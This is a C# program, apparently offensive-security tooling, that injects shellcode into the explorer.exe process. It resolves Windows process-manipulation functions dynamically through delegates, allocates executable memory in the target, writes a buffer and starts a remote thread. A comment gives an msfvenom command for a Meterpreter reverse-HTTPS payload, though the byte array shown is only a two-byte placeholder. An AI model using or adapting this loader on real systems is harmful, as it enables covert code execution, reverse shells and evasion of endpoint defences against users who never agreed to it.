using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace Standard_Process_Injection_Delegate
{
    class Program
    {

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
        static extern IntPtr LoadLibraryA(string lpLibFileName);

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

        private delegate IntPtr OpenProcessDelegate(uint processAccess, bool bInheritHandle, uint processId);
        private delegate IntPtr VirtualAllocExDelegate(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        private delegate bool ReadProcessMemoryDelegate(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);
        private delegate bool WriteProcessMemoryDelegate(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
        private delegate IntPtr CreateRemoteThreadDelegate(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        static void Main(string[] args)
        {

            // Load kernel32.dll
            IntPtr hKernel32 = LoadLibraryA("kernel32.dll");

            // Get function pointers
            IntPtr pOpenProcess = GetProcAddress(hKernel32, "OpenProcess");
            IntPtr pVirtualAllocEx = GetProcAddress(hKernel32, "VirtualAllocEx");
            IntPtr pReadProcessMemory = GetProcAddress(hKernel32, "ReadProcessMemory");
            IntPtr pWriteProcessMemory = GetProcAddress(hKernel32, "WriteProcessMemory");
            IntPtr pCreateRemoteThread = GetProcAddress(hKernel32, "CreateRemoteThread");

            // Convert function pointers to delegates
            OpenProcessDelegate OpenProcess = (OpenProcessDelegate)Marshal.GetDelegateForFunctionPointer(pOpenProcess, typeof(OpenProcessDelegate));
            VirtualAllocExDelegate VirtualAllocEx = (VirtualAllocExDelegate)Marshal.GetDelegateForFunctionPointer(pVirtualAllocEx, typeof(VirtualAllocExDelegate));
            ReadProcessMemoryDelegate ReadProcessMemory = (ReadProcessMemoryDelegate)Marshal.GetDelegateForFunctionPointer(pReadProcessMemory, typeof(ReadProcessMemoryDelegate));
            WriteProcessMemoryDelegate WriteProcessMemory = (WriteProcessMemoryDelegate)Marshal.GetDelegateForFunctionPointer(pWriteProcessMemory, typeof(WriteProcessMemoryDelegate));
            CreateRemoteThreadDelegate CreateRemoteThread = (CreateRemoteThreadDelegate)Marshal.GetDelegateForFunctionPointer(pCreateRemoteThread, typeof(CreateRemoteThreadDelegate));


            // Grabs the current PID of the explorer
            var processes = Process.GetProcessesByName("explorer");
            System.Diagnostics.Process sprocess = processes[0];

            IntPtr hProcess = OpenProcess(0x001F0FFF, false, (uint)sprocess.Id);
            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);

            // msfvenom.bat -p windows/x64/meterpreter/reverse_https LHOST=127.0.0.1 LPORT=7710 -f csharp EXITFUNC=thread
            byte[] buf = new byte[2] { 0x8A, 0x0D };

            IntPtr outSize;
            WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);

            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        }
    }
}
